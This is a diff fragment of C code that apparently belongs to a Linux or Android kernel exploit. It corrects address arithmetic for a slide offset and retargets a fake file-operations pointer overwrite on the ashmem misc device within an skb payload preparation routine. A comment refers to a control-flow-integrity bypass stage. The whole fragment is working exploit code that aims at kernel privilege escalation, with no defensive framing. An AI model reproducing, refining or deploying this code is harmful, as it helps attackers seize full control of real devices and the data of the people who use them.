@@ -349,11 +349,11 @@ uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
-  return p0_data_alias(image_addr);
+  return p0_data_alias(image_addr) + slide_p0_offset;
 }
 
 uintptr_t misc_fops_data_addr(void) {
-  return p0_data_alias(ASHMEM_MISC_FOPS) +
+  return data_addr(ASHMEM_MISC_FOPS) +
          (ASHMEM_MISC_FOPS_FIELD_OFF - ASHMEM_MISC_FOPS_OFF);
 }
 
@@ -641,9 +641,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     slide_bank_payload_base = payload_base;
     slide_bank_parents[0] = fake_fops;
-    /* The physical fops route targets the enclosing object. The CFI stage
-     * separately addresses the fops pointer field inside that object. */
-    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
+    slide_bank_targets[0] = misc_fops_data_addr();
   }
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
